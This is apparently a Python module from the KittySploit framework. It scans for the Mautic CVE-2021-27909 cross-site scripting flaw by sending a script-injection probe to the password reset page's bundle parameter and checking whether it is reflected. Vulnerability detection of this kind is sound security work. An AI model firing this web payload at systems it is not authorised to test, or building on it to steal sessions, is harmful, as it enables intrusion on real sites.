#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Mautic before 3."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Mautic <3.3.4 - Cross-Site Scripting Detection',
        'description': 'Mautic before 3.3.4 contains a cross-site scripting vulnerability on the password reset page in the bundle parameter of the URL. An attacker can inject arbitrary script, steal cookie-based authentication credentials, and/or launch other attacks.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2021', 'mautic', 'xss', 'acquia', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://github.com/mautic/mautic/security/advisories/GHSA-32hw-3pvh-vcvc',
            'https://nvd.nist.gov/vuln/detail/CVE-2021-27909',
            'https://github.com/ARPSyndicate/cvemon',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2021-27909',
    }

    def run(self):
        r = self.http_request(method="GET", path="/passwordreset?bundle=';alert(document.domain);var+ok='", allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ("'';alert(document.domain);var ok='", 'mauticBasePath',)
        header_any = ('text/html',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='medium',
                reason="Mautic <3.3.4 - Cross-Site Scripting detected",
                path="/passwordreset?bundle=';alert(document.domain);var+ok='",
            )
            return True
        return False

